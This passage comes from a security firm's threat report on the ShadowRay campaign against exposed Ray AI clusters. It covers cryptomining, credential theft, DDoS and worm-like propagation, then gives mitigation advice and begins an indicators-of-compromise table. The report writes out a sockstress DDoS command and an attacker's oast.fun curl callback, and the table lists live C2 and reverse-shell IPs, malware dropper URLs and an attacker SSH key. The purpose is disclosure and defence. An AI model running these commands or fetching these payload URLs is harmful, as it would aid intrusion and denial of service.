suspicious and benefits malware thanks to github’s SSL and domain trust - and it seems to be up for more than 6 years. It is quite easy to identify repositories with similar characteristics (not code, many releases). </figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac27d_691bd9e3e579c4823eedcdbe_63d019ea.png" loading="lazy"/></div><figcaption>The configuration of the payload that is being downloaded from GitLab.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac26b_691bd9e3e579c4823eedcdc4_14185e5d.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac279_691bd9e3e579c4823eedcdc7_ef9a71ce.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac284_691bd9e3e579c4823eedcdcd_ba6b93b8.png" loading="lazy"/></div><figcaption>Platform-independent firewall blocking of competing miners through hosts file</figcaption></figure><h3><strong>12: Live Campaign Evolution - &quot;Attack Infrastructure as Code&quot;</strong></h3><p>The GitLab repository <code>ironern440-group/ironern440-project</code> showed active commits, meaning attackers are iterating on their payloads in real-time. All compromised systems pulled updates every 15 minutes, so improvements propagate across the entire botnet within hours.</p><p>This is DevOps for cybercrime. Attackers used GitLab as their CI/CD pipeline for malware distribution. They can A/B test techniques, roll back failed updates, and respond to defensive measures - all through version control. The commit history showed active development in realtime.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8e229eb99a3dcac294_691bd9e3e579c4823eedcdca_0f75aa00.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac18c_691bd9e3e579c4823eedcd8b_7168cb5f.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac172_691bd9e3e579c4823eedcd8e_a6ad8d6f.png" loading="lazy"/></div></figure><p>The files when accessed in Nov. 2</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac175_691bd9e3e579c4823eedcda6_14f4b43c.png" loading="lazy"/></div></figure><p>The files when accessed in Nov. 4<br/></p><p>Attacker payload changes were visible through GitLab.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1b1_691bd9e3e579c4823eedcda9_081c2815.png" loading="lazy"/></div></figure><p>The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.<br/><br/></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac17f_691bd9e3e579c4823eedcdaf_c3137b29.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac192_691bd9e3e579c4823eedcdac_6e73dc89.png" loading="lazy"/></div></figure><p>The diff was visible through GitLab easily - a commit that removes all comments of the LLM-generated payloads.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1aa_691bd9e3e579c4823eedcdb5_d3442245.png" loading="lazy"/></div></figure><p>Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8e229eb99a3dcac291_691bd9e3e579c4823eedcdb8_96d067f9.png" loading="lazy"/></div><figcaption>CryptoMiners were served through GitHub release files</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac18f_691bd9e3e579c4823eedcdbb_6077a02a.png" loading="lazy"/></div><figcaption>Attackers have downloaded the XMRig (cryptominer) from different repositories and IPs over time. We found this gitlab username in one of the payload commented out bash lines. </figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac16f_691bd9e3e579c4823eedcdb2_30af7666.png" loading="lazy"/></div><figcaption>The commented out username found in one of the payloads was blocked, probably due to the same activity.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac27d_691bd9e3e579c4823eedcdbe_63d019ea.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac273_691bd9e3e579c4823eedce08_b855cce5.png" loading="lazy"/></div><figcaption>The configuration of the payload that is being downloaded from GitLab.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac276_691bd9e3e579c4823eedce0b_c1341cf9.png" loading="lazy"/></div><figcaption>Attackers added their own SSH Keys.  They tried different home directories and users.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b90229eb99a3dcac34f_691bd9e3e579c4823eedce05_4a6cb649.png" loading="lazy"/></div><figcaption>Attackers added their own SSH Keys.  They tried different home directories and users. After enumeration, they succeeded and added their own SSH key to root’s authorized keys.</figcaption></figure><h3><strong>13: Sensitive Data Access - &quot;Beyond Cryptocurrency&quot;</strong></h3><p>Attackers could see everything the workloads are doing - including access to the proprietary AI models and filesystem, application user requests, application code and configuration.<br/>They discovered and exfiltrated MySQL database credentials from Ray job environment variables and config files. The exposed credentials provide root access to a MySQL database that is used in production application.</p><p>We also found many security tokens and cloud credentials present on the compromised machines workloads - by analyzing the code, command lines and and the environment variables of the running processes on the compromised machines. This reveals the attack scope extends beyond cryptojacking.</p><p>With database credentials, attackers can exfiltrate sensitive data, inject backdoors into applications, or sell access to other threat actors. The presence of MySQL credentials in environment variables (just one example) suggests the compromised system is part of a larger application infrastructure.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac360_691bd9e3e579c4823eedce12_36340ea9.png" loading="lazy"/></div></figure><p>On some instances that models were present (for example, pytorch pickle file of the model weights and frozen graph). These proprietary, custom models are considered unique IP that is a competitive advantage to the company. Attackers could steal them from the compromised machines, as well as their source code and user data that was retained on the machines.</p><h3><strong>14: DDoS in action - &quot;Multi-Purpose Botnet&quot;</strong></h3><p>Attackers deployed sockstress, a TCP state exhaustion tool, targeting production websites. This suggests the compromised Ray clusters are being weaponized for denial-of-service attacks, possibly against competing mining pools or other infrastructure - or as another way to monetize their compromised hardware (compromised infrastructure as a service).</p><p>This transforms the operation from pure cryptojacking into a<strong> multi-purpose botnet</strong>. The ability to <strong>launch DDoS attacks </strong>adds another monetization vector - attackers can rent out DDoS capacity or use it to eliminate competition. The target port 3333 is commonly used by mining pools, <strong>suggesting attacks against rival mining infrastructure.</strong></p><p><strong>DDoS Command used by attackers</strong>:</p><p><code>./sockstress &lt;redacted_hostname&gt; 3333 eth0 -p payloads/http</code></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac35a_691bd9e3e579c4823eedce0e_ad45a04b.png" loading="lazy"/></div><figcaption>&#x27;sockstress&#x27; used for DDOS - with specific IPs and specific ports.</figcaption></figure><h3><strong>15: Spray and Pray - &quot;Using Victims to Find More Victims&quot;</strong></h3><p>Compromised Ray clusters were used to spray attack payloads to other Ray dashboards worldwide. The attackers essentially created a self-propagating worm that uses one victim to scan for and compromise the next victim.</p><p>This is worm-like behavior in cloud infrastructure. Instead of centralized scanning (which is noisy and detectable), attackers distributed the scanning across their botnet. Each compromised cluster helps discover and infect new clusters, creating exponential growth. The use of interact.sh for callback means attackers only see successful compromises, reducing noise.</p><p><strong>Propagation Flow</strong>:</p><ol role="list"><li>Compromised Cluster A scans for exposed Ray dashboards</li><li>Sends test payload with interact.sh callback</li><li>Attacker sees successful callback</li><li>Attacker sends full payload to new victim</li><li>New victim joins botnet and starts scanning</li><li>Repeat</li></ol><h2><strong>GitHub-Launched Attack Campaign: Technical Breakdown and Evidence of Techniques</strong></h2><p>Following the attackers’ GitLab account and repository being taken down on November 5, 2025, the attackers migrated the repo to GitHub, where they remain active. They created the new GitHub repo on November 10, 2025.<br/>Below, we walk through the techniques the attackers used with GitHub as their delivery mechanism, providing evidence of what was uncovered and how they evolved their methods. </p><h3>Moving to GitHub</h3><p>The second phase was even more successful.</p><p>Attackers Ported to GitHub on November 10, 2025. We identified a compromised Ray cluster and were surprised to see <strong>a new GitHub repository</strong> in the payload from the willd, replacing the repository that was removed by GitLab after we reported the first phase.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac38e_691bd9e3e579c4823eedce15_68d7f028.png" loading="lazy"/></div><figcaption>The public repository <a href="https://github.com/thisisforwork440-ops/ironrock">https://github.com/thisisforwork440-ops/ironrock</a> was used in the payload</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac38b_691bd9e3e579c4823eedce18_04e430a7.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac363_691bd9e3e579c4823eedce1b_72bf9ba5.png" loading="lazy"/></div><figcaption>Note the documentation - the caps letters and extensive changelog documentation hints on AI-assisted exploit adaptation based on feedback.</figcaption></figure><h3>Compromised Clusters With Thousands of Active Nodes (machines)</h3><p>Attackers put hands on internet-facing clusters with<strong> thousands of machines</strong> (Worth $4M USD per year) - utilizing 100% CPU on the compromised Ray nodes:</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac371_691bd9e3e579c4823eedce1e_473404a4.png" loading="lazy"/></div><figcaption>Ray cluster with more than thousand active nodes that was compromised - 100% CPU utilization on 60% of the cluster.<br/></figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac35d_691bd9e3e579c4823eedce22_05087aef.png" loading="lazy"/></div><figcaption>Cluster HW breakdown. The annual price on-demand exceeds $3 million USD from this cluster alone!</figcaption></figure><p>One of the servers had a network NFS mount, which included <strong>240GB</strong> of Source Code, AI Models and Datasets. Everything the company is doing for the past few years, exposed to the internet.:</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b90229eb99a3dcac349_691bd9e3e579c4823eedce25_40803294.png" loading="lazy"/></div><figcaption>Archive that includes source code, models, and datasets - <strong>240GB compressed (Petabytes after extraction)</strong></figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac374_691bd9e3e579c4823eedce28_3434270b.png" loading="lazy"/></div><figcaption>Machines with access to AWS EKS roles </figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac383_691bd9e3e579c4823eedce2b_47f7cb6c.png" loading="lazy"/></div><figcaption>The attackers used POCs for ShadowRay from the internet for Initial Access - we identified it through reverse search, it looked familiar.</figcaption></figure><h3>Mining Pool Statistics</h3><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac36a_691bd9e3e579c4823eedce2e_10940d79.png" loading="lazy"/></div></figure><p>In a new mining pool for the second phase of the attack, the attackers reached the #1 spot among 100+ registered miners. The attacker HashRate (and financial reward) kept increasing until we reported the user activity to GitHub.</p><h3>Improving the exploit </h3><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b90229eb99a3dcac346_691bd9e3e579c4823eedce31_d4dfa1b5.png" loading="lazy"/></div><figcaption>The attackers leveraged a new cryptominer that utilizes GPU better, by checking whether it is a GPU machine (through ‘nvidia-smi’ utility)</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b90229eb99a3dcac343_691bd9e3e579c4823eedce40_794be91e.png" loading="lazy"/></div><figcaption>Masquerading new legitimate paths for the binaries</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac386_691bd9e3e579c4823eedce49_3ec33f60.png" loading="lazy"/></div><figcaption>New cronjobs were utilizing the GitHub repo -note the documentation (&quot;**China Version**&quot;)</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b90229eb99a3dcac34c_691bd9e3e579c4823eedce46_0123942e.png" loading="lazy"/></div><figcaption>We found many new IoCs in the second part of the campaign.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac367_691bd9e3e579c4823eedce43_de5a1c89.png" loading="lazy"/></div></figure><p>An ELF executable that was downloaded from the attacker’s servers. We started reverse engineering it . It was an unpacker with unpopular compression that executed code through stack-based syscall direct execution </p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac377_691bd9e3e579c4823eedce4f_39bc0876.png" loading="lazy"/></div><figcaption>Reverse Engineering the dropper/unpacker. The attackers used a custom dropper/loader with LZSS compression, dynamic syscalls invocation like mmap and memunmap through a function pointer, ROP and stack manipulation. The direct syscall() instruction bypasses libc and many security products.</figcaption></figure><p>‍</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac391_691bd9e3e579c4823eedce52_e4972f5b.png" loading="lazy"/></div><figcaption>The binary cryptominer used was flagged by 28 out of 65 vendors on VirusTotal.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b91229eb99a3dcac399_691bd9e3e579c4823eedce55_23ee32c2.png" loading="lazy"/></div><figcaption>We reported the account to GitHub, which quickly blocked it as of November 17, 2025.<br/>The attackers opened a new account on the same day, within 2 hours, and continue to use GitHub. We believe this campaign is automated due to the pace of recovery and stealthy operation across providers and worldwide.</figcaption></figure><h2><strong>Attack Matrix Breakdown</strong></h2><p>The ShadowRay campaign TTPs breakdown is available in the <a href="https://app-attack-matrix.com/attacks/#shadowray">Application Attack Matrix</a>:</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b93229eb99a3dcac4c0_691bd9e3e579c4823eedce4c_a5661dc7.png" loading="lazy"/></div><figcaption>The sub-techniques used by attackers in ShadowRay from March 2024. <br/>Now, attackers are more sophisticated, and were using techniques we have not seen before.<br/><br/>More on<a href="https://app-attack-matrix.com/attacks/#shadowray">https://app-attack-matrix.com/attacks/#shadowray</a></figcaption></figure><h2><strong>Why It Matters: Growing AI Attack Surface</strong></h2><p>AI workloads are increasingly deployed at scale, often with less mature security controls than traditional infrastructure. Because Ray’s design assumes an internal, trusted environment, many clusters are deployed with ports exposed publicly, and authentication disabled. These factors make ShadowRay a ripe vulnerability for attackers to exploit, as it has a dangerous combination of a lot of exposed infrastructure and the ability to lead to meaningful impact for attackers. </p><p>As organizations race to deploy AI systems, it’s critical to remember that many AI products and services embed or depend on Ray, making it pivotal to ensure it is configured properly across environments. Plus, many AI orchestration tools remain vulnerable to <a href="https://www.oligo.security/blog/0-0-0-0-day-exploiting-localhost-apis-from-the-browser">0.0.0.0-style </a>misconfigurations that mirror ShadowRay’s exploitation pattern. </p><p><strong>The Risk of Disputed Vulnerabilities</strong></p><p>The ShadowRay case highlights a critical challenge in modern software security: what happens when a <a href="https://www.oligo.security/blog/shadow-vulnerabilities-in-ai-the-hidden-perils-beyond-cves">vulnerability is disputed instead of fixed</a>. When Oligo first disclosed active exploitation of CVE-2023-48022 in 2024, the Ray maintainers argued that Ray should only ever run in tightly controlled, closed environments, and therefore saw no need to release a patch. Nearly two years later, attackers are still exploiting the same flaw, in new and increasingly sophisticated campaigns, even in later Ray versions that are up to date.</p><p>Disputed vulnerabilities create a dangerous gray area for defenders because they are not formally patched. As a result, organizations may unknowingly deploy or run software that remains exploitable in real-world conditions. ShadowRay demonstrates how attackers exploit that uncertainty, targeting configurations that weren’t meant to be internet-facing, chaining legitimate orchestration features, and adapting rapidly with AI-generated payloads.</p><p>Understanding your environment becomes essential. Knowing not only what open-source components you use, but how they are configured, exposed, and behaving at runtime, can be the difference between protection and compromise.</p><h2><strong>Mitigation Strategies</strong></h2><p>For organizations that run Ray in their environments, below are mitigation and protection recommendations.</p><ul role="list"><li>Leverage Anyscale’s <a href="https://github.com/ray-project/ray-open-ports-checker">Ray Open Ports Checker</a> to verify proper configuration of the clusters to avoid accidental exposure. See <a href="https://www.anyscale.com/blog/update-on-ray-cve-2023-48022-new-verification-tooling-available">Anyscale’s Update on CVE-2023-48022</a>.</li><li>Follow the <a href="https://docs.ray.io/en/latest/ray-security/index.html">Ray Deployment Best Practices</a> for securing Ray deployments. <br/><ul role="list"><li>Start with running Ray within a secured, trusted environment.</li><li>Always add firewall rules or security groups to prevent unauthorized access.</li></ul></li><li>Add authorization on top of the Ray Dashboard port (8265 by default). <br/><ul role="list"><li>If you do need Ray’s dashboard to be accessible, implement a proxy that adds an authorization layer to the Ray API when exposing it over the network.</li></ul></li><li>Continuously monitor your production environments and AI clusters for anomalies, even within Ray. <br/><ul role="list"><li><strong>Ray depends on arbitrary code execution to function</strong>. Code Scanning and Misconfiguration tools will not be able to detect such attacks, because the open-source maintainers of Ray (Anyscale) marked it as disputed and confirmed it is not a bug - at the time of writing, it is a feature.</li><li><strong>Don’t bind on 0.0.0.0 to make your life easy</strong> - It is recommended to use an IP of an explicit network interface, such as the IP that is in the subnet of your local network or a trusted private VPC/VPN.</li><li><strong>Don’t trust the default </strong>- Sometimes tools assume you read their docs. Do it.</li><li><strong>Use the right tools</strong> - The technical burden of securing open source is yours. Don&#x27;t rely on the maintainers, <a href="https://www.oligo.security/product/oligo-sentry">there are tools</a> that can help you protect your production workloads from the risks of using open source at runtime.</li></ul></li></ul><h1>How to find out if you are compromised</h1><h2>Indicators of Compromise (IoCs)</h2><p>‍</p><div class="w-embed"><style>
+tr, td{
+  border: 1px solid #ddd;
+    text-align: center;
+}
+
+table {
+	border: 1px solid black;
+}
+</style>
+<table >
+    <tr>
+        <td>IOC Type</td>
+        <td>Indicator</td>
+        <td>Port ֿ/ Details</td>
+        <td>Context</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>18.228.3.224</td>
+        <td>48331, 3876</td>
+        <td>AWS-hosted primary C2 server for reverse shells - São Paulo, Brazil (Amazon.com, amazonaws.com)</td>
+    </tr>
+     <tr>
+        <td>IP Address</td>
+        <td>45.95.168.100</td>
+        <td>8000</td>
+        <td>Attackers C2 / File server for downloading binaries</td>
+    </tr>
+     <tr>
+        <td>IP Address</td>
+        <td>185.215.180.70</td>
+        <td>8000</td>
+        <td>Attackers C2 / File server for downloading binaries</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>104.194.151.181</td>
+        <td>443</td>
+        <td>Attackers Reverse Shell - United Kingdom (Tornado Datacenter, cloudzy.com)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>121.160.102.68</td>
+        <td>8384</td>
+        <td>Attackers Reverse Shell - Seongbuk-gu, Seoul, South Korea (KT, Cable/DSL)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>54.154.170.233</td>
+        <td>30654</td>
+        <td>Attackers Reverse Shell - Dublin, Ireland (Amazon.com, amazonaws.com)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>158.160.123.117</td>
+        <td>4444</td>
+        <td>Attackers Reverse Shell - Moscow, Russia (Yandex.Cloud)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>193.29.224.83</td>
+        <td>6543</td>
+        <td>Attackers Reverse Shell - Helsinki, Finland (Aeza International, ptr.network)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>162.248.53.119</td>
+        <td>8000</td>
+        <td>Attacker payload server (netsh, myscript.sh) - United States (Gigas Hosting Usa, LLC)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>103.127.134.124</td>
+        <td>30654</td>
+        <td>Attacker - Reverse Shell - Bogor, Indonesia (PT. Biznet Gio Nusantara, biznetg.io)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>18.230.118.147</td>
+        <td>443, 40331</td>
+        <td>Attacker AWS-hosted secondary C2 server, XMRig mining - São Paulo, Brazil (Amazon.com, amazonaws.com)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>67.217.57.240</td>
+        <td>666</td>
+        <td>Attacker File hosting server for malware distribution (netsh) - United States (Interserver)</td>
+    </tr>
+    <tr>
+        <td>IP Address</td>
+        <td>45.61.150.83</td>
+        <td>80</td>
+        <td>Attacker file hosting server for malware distribution (xd.sh) based in United States</td>
+    </tr>
+    <tr>
+        <td>Domain</td>
+        <td>*.oast.fun</td>
+        <td>53</td>
+        <td>OAST platform (interact.sh) callback for discovery reconnaissance</td>
+    </tr>
+    <tr>
+        <td>SubDomain</td>
+        <td>bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun</td>
+        <td>80, 443</td>
+        <td>Attacker out-of-band interactsh subdomain for out-of-band callback (DNS/HTTP request) - phone home to alert about compromised IP</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun</td>
+        <td></td>
+        <td>InteractSH attackers oast.fun subdomain callback for discovery before initial access (attacker’s crawlers sprayed this payload)</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>disown</td>
+        <td></td>
+        <td>Detaching processes in Ray clusters (Keep the subprocess with reverse shells and cryptominers)</td>
+    </tr>
+    <tr>
+        <td>Domain</td>
+        <td>pool.supportxmr.com</td>
+        <td>443</td>
+        <td>Primary Monero mining pool (TLS-encrypted)</td>
+    </tr>
+    <tr>
+        <td>Domain</td>
+        <td>gulf.moneroocean.stream</td>
+        <td>20128</td>
+        <td>Secondary Monero Mining Pool</td>
+    </tr>
+    <tr>
+        <td>Monero Wallet Address</td>
+        <td>45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1</td>
+        <td></td>
+        <td>Attacker&#39;s Monero wallet address</td>
+    </tr>
+    <tr>
+        <td>ZANO Wallet Address</td>
+        <td>KrQtbtsrPTqSTzQwZZisiyJxgtcDMwrdVrQ</td>
+        <td></td>
+        <td>Attacker ZANO address used in cryptominer payload</td>
+    </tr>
+    <tr>
+        <td>Mining Pool Address</td>
+        <td>eu.zano.k1pool.com</td>
+        <td>8866</td>
+        <td>ZANO Mining pool observed in GitHub second payload (xd.sh)</td>
+    </tr>
+    <tr>
+        <td>SSH Public Key</td>
+        <td>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHy6WMgqslpdUCaumLmlUcBjBjuAk4KspADxbcAKrzYd root@archtop</td>
+        <td></td>
+        <td>Attacker’s SSH Public key that was appended to the authorized keys file during the payload, to enable SSH access.</td>
+    </tr>
+    <tr>
+        <td>GitLab Repository</td>
+        <td>gitlab.com/ironern440-group/ironern440-project</td>
+        <td>443</td>
+        <td>Primary C2 for payload hosting and continuous updates</td>
+    </tr>
+    <tr>
+        <td>GitLab User</td>
+        <td>ironern440-group</td>
+        <td></td>
+        <td>Attacker&#39;s 1st stage GitLab organization (blocked)</td>
+    </tr>
+    <tr>
+        <td>GitLab User</td>
+        <td>least3654</td>
+        <td></td>
+        <td>Attacker&#39;s 1st stage GitLab previous organization (blocked)</td>
+    </tr>
+    <tr>
+        <td>GitHub user</td>
+        <td>thisisforwork440-ops</td>
+        <td></td>
+        <td>Attacker&#39;s 2nd phase GitHub organization</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh</td>
+        <td>443</td>
+        <td>Monitoring/persistence script</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh</td>
+        <td>443</td>
+        <td>Cleanup/setup script</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run.sh</td>
+        <td>443</td>
+        <td>Main execution script (non-China)</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh</td>
+        <td>443</td>
+        <td>China-specific payload</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz</td>
+        <td>443</td>
+        <td>Legitimate XMRig download (v6.16.4)</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>https://github.com/rigelminer/rigel/releases/download/1.22.3/rigel-1.22.3-linux.tar.gz</td>
+        <td></td>
+        <td>Optimized GPU Miner used in 2nd phase of the campaign</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>http://45.61.150.83/1mmy/xd.sh</td>
+        <td>80</td>
+        <td>Malware Dropper from attacker’s controlled file server - used in 2nd phase of the campaign</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>http://45.61.150.83/1mmy/cloud</td>
+        <td>80</td>
+        <td>Malware Dropper from attacker’s controlled file server - used in 2nd phase of the campaign</td>
+    </tr>
+    <tr>
+        <td>SHA256</td>
+        <td>6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063</td>
+        <td></td>
+        <td>SHA256 of the XMRig Binary from GitHub (version 6.16.4)</td>
+    </tr>
+    <tr>
+        <td>SHA256</td>
+        <td>1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b</td>
+        <td></td>
+        <td>Hash of secondary bash dropped/unpacker (xd.sh)</td>
+    </tr>
+    <tr>
+        <td>MD5</td>
+        <td>1f63fa7921c2f5fb8f8ffa430d02ac4a</td>
+        <td></td>
+        <td>Hash of secondary bash dropped/unpacker (xd.sh)</td>
+    </tr>
+    <tr>
+        <td>SHA1</td>
+        <td>779a8af3b9838a33d1e199da3fc2f02a49e7c13e</td>
+        <td></td>
+        <td>Hash of secondary bash dropped/unpacker (xd.sh)</td>
+    </tr>
+    <tr>
+        <td>URL</td>
+        <td>http://67.217.57.240:666/files/netsh</td>
+        <td>666</td>
+        <td>Malicious binary download - reverse shell</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>dns-filter</td>
+        <td></td>
+        <td>Masqueraded XMRig miner binary</td>
+    </tr>
+    <tr>
+        <td>Path</td>
+        <td>/usr/lib/dev/systemdev/dns-filter</td>
+        <td></td>
+        <td>Full path to disguised miner</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>.python3.6</td>
+        <td></td>
+        <td>Hidden XMRig miner binary (note the leading dot)</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>rigel</td>
+        <td></td>
+        <td>GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>python3.7.3</td>
+        <td></td>
+        <td>GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>netsh</td>
+        <td></td>
+        <td>Downloaded malicious binary</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>sockstress</td>
+        <td></td>
